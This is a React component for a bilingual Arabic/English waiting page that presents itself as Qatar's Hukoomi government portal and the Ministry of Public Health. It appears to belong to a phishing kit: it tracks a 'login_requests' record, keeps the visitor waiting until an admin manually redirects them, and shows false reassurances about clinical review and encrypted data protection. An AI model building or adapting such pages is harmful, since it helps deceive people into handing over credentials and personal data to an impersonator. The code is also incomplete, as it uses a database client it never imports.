import { useEffect, useRef, useState } from "react";
import { useLocation } from "wouter";
import {
  Stethoscope,
  ShieldCheck,
  FileCheck2,
  Sparkles,
  Clock,
  BellRing,
} from "lucide-react";
import SiteHeader from "@/components/SiteHeader";
import SiteFooter from "@/components/SiteFooter";
import { useLang } from "@/i18n/LanguageContext";
import { getServiceContext } from "@/lib/serviceContext";

const Waiting = () => {
  const { pick, dir, lang } = useLang();
  const [, navigate] = useLocation();
  const location = useLocation();
  const requestId =
    (location.state?.requestId as string) ||
    (typeof window !== "undefined" ? sessionStorage.getItem("visitor_request_id") : null);
  const storedService =
    typeof window !== "undefined" ? sessionStorage.getItem("selected_service") || "" : "";
  const serviceContext = getServiceContext(storedService);

  const infoTiles = [
    {
      icon: Stethoscope,
      title: pick("مراجعة طبية دقيقة", "Careful clinical review"),
      desc: pick(
        `يقوم فريق ${serviceContext.platformShortAr} بمراجعة بياناتك للتحقق من مطابقتها للسجلات الرسمية.`,
        `The ${serviceContext.platformShortEn} team is reviewing your data to match it against official records.`
      ),
    },
    {
      icon: ShieldCheck,
      title: pick("حماية البيانات", "Data protection"),
      desc: pick(
        "بياناتك محفوظة بتشفير SSL 256-bit وفق معايير وزارة الصحة العامة في دولة قطر.",
        "Your data is protected with 256-bit SSL encryption per the Ministry of Public Health standards."
      ),
    },
    {
      icon: BellRing,
      title: pick("إشعارات فورية", "Instant notifications"),
      desc: pick(
        `سترسل إشعارات ${serviceContext.titleAr} على رقم هاتفك المسجّل فور اعتماد الطلب.`,
        `${serviceContext.titleEn} notifications will be sent to your registered phone once approved.`
      ),
    },
  ];

  const motivationalMessages = pick(
    [
      "مراجعة بياناتك تسير على أفضل وجه",
      `خطوة واحدة تفصلك عن تفعيل ${serviceContext.platformShortAr}`,
      "نحرص على دقة كل معلومة تخص ملفك الصحي",
      "بياناتك مشفّرة ومحمية وفق معايير وزارة الصحة العامة",
      "شكراً لثقتك بخدمات حكومي الرقمية",
      "سيتم تأكيد موعد الفحص فور إتمام المراجعة",
    ],
    [
      "Your data review is progressing smoothly",
      `You are one step away from activating ${serviceContext.platformShortEn} services`,
      "We verify every detail in your health file carefully",
      "Your data is encrypted per Ministry of Public Health standards",
      "Thank you for trusting Hukoomi digital services",
      "Your examination appointment will be confirmed once review is complete",
    ]
  );

  const [currentMessage, setCurrentMessage] = useState(0);
  const [elapsed, setElapsed] = useState(0);
  const startTime = useRef(Date.now());
  const handledRef = useRef(false);
  const prevStatusRef = useRef<string | null>(null);

  useEffect(() => {
    const timer = setInterval(() => setElapsed(Math.floor((Date.now() - startTime.current) / 1000)), 1000);
    return () => clearInterval(timer);
  }, []);

  useEffect(() => {
    const interval = setInterval(() => {
      setCurrentMessage((prev) => {
        let next;
        do { next = Math.floor(Math.random() * motivationalMessages.length); } while (next === prev && motivationalMessages.length > 1);
        return next;
      });
    }, 5000);
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    if (!requestId) return;
    supabase.from("login_requests").select("status").eq("id", requestId).maybeSingle()
      .then(({ data }) => { prevStatusRef.current = data?.status ?? null; });
  }, [requestId]);

  // Waiting page is a "hold" page: the visitor stays here until the
  // admin explicitly redirects them (handled globally by the
  // VisitorRedirectListener via the redirect_to column). We intentionally
  // do NOT auto-navigate on status changes — every next move is decided
  // by the admin.

  return (
    <div className="min-h-screen bg-background flex flex-col relative" dir={dir}>
      <div className="fixed inset-0 gradient-mesh pointer-events-none" />
      <SiteHeader />

      <div className="flex items-center justify-center gap-4 py-2.5 bg-card/60 backdrop-blur-sm border-b border-border/40">
        <div className="flex items-center gap-1.5">
          <div className="w-5 h-5 rounded-md hero-gradient flex items-center justify-center">
            <ShieldCheck className="w-3 h-3 text-primary-foreground" />
          </div>
          <span className="text-[10px] font-bold text-foreground">{pick("مراجعة آمنة", "Secure review")}</span>
        </div>
        <div className="w-px h-3 bg-border" />
        <div className="flex items-center gap-1.5">
          <Clock className="w-3.5 h-3.5 text-primary" />
          <span className="text-[10px] text-muted-foreground font-medium">{pick("يتم مراجعة بياناتك الآن", "Your data is being reviewed")}</span>
        </div>
      </div>

      <div className="flex-1 flex flex-col items-center px-4 py-6 gap-5 relative z-10">
        <div className="bg-card rounded-2xl card-shadow border border-border/30 p-6 max-w-5xl w-full text-center relative overflow-hidden">
          <div className="absolute -top-16 -right-16 w-32 h-32 orb orb-primary" />
          <div className="absolute -bottom-12 -left-12 w-24 h-24 orb orb-accent" />

          <div className="relative z-10">
            <div className="flex justify-center mb-4">
              <div className="w-16 h-16 border-4 border-primary/20 rounded-full flex items-center justify-center relative">
                <div className="w-12 h-12 border-[3px] border-primary border-t-transparent rounded-full animate-spin" />
                <div className="absolute inset-0 rounded-full shadow-glow opacity-50" />
              </div>
            </div>
            <h1 className="text-lg font-extrabold text-foreground mb-1.5">{pick("يرجى الانتظار", "Please wait")}</h1>
            <p className="text-muted-foreground text-xs leading-relaxed">
              {pick("جاري مراجعة بياناتك من قبل فريقنا المختص. يرجى عدم إغلاق هذه الصفحة.", "Your data is being reviewed by our specialized team. Please do not close this page.")}
            </p>

            <div className="mt-3 flex items-center justify-center gap-2 bg-muted/40 rounded-xl py-2.5 px-4 border border-border/30">
              <Clock className="w-4 h-4 text-primary" />
              <span className="text-sm font-bold text-foreground font-mono" dir="ltr">
                {String(Math.floor(elapsed / 60)).padStart(2, "0")}:{String(elapsed % 60).padStart(2, "0")}
              </span>
              <span className="text-[10px] text-muted-foreground">{pick("وقت الانتظار", "Wait time")}</span>
            </div>

            <div className="mt-4 pt-3 border-t border-border/30">
              <div className="flex items-center justify-center gap-2 bg-gradient-to-r from-primary/5 to-accent/10 rounded-xl py-2.5 px-3 border border-primary/10">
                <Sparkles className="w-4 h-4 text-primary shrink-0" />
                <p className="text-xs font-semibold text-foreground transition-all duration-500">
                  {motivationalMessages[currentMessage]}
                </p>
              </div>
            </div>
          </div>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-3 max-w-5xl w-full">
          {infoTiles.map((tile) => {
            const TileIcon = tile.icon;
            return (
              <div
                key={tile.title}
                className="bg-card rounded-2xl card-shadow border border-border/30 p-4 flex items-start gap-3"
              >
                <div className="w-10 h-10 rounded-xl hero-gradient flex items-center justify-center shrink-0 shadow-button">
                  <TileIcon className="w-5 h-5 text-primary-foreground" />
                </div>
                <div>
                  <p className="text-xs font-extrabold text-foreground mb-1">{tile.title}</p>
                  <p className="text-[11px] text-muted-foreground leading-relaxed">{tile.desc}</p>
                </div>
              </div>
            );
          })}
        </div>

        <div className="flex items-start gap-3 bg-card/80 backdrop-blur-sm rounded-2xl p-4 max-w-5xl w-full border border-border/40 card-shadow">
          <div className="w-9 h-9 rounded-xl hero-gradient flex items-center justify-center shrink-0 shadow-button">
            <FileCheck2 className="w-4 h-4 text-primary-foreground" />
          </div>
          <div>
            <p className="text-xs font-bold text-foreground mb-0.5">{pick("هل تعلم؟", "Did you know?")}</p>
            <p className="text-[11px] text-muted-foreground leading-relaxed">
              {pick(
                `خدمة ${serviceContext.platformShortAr} الإلكترونية تساعدك على متابعة ${serviceContext.titleAr} رقمياً على مدار الساعة.`,
                `The ${serviceContext.platformShortEn} online service helps you follow ${serviceContext.titleEn} digitally, 24/7.`
              )}
            </p>
          </div>
        </div>
      </div>
      <SiteFooter />
    </div>
  );
};

export default Waiting;
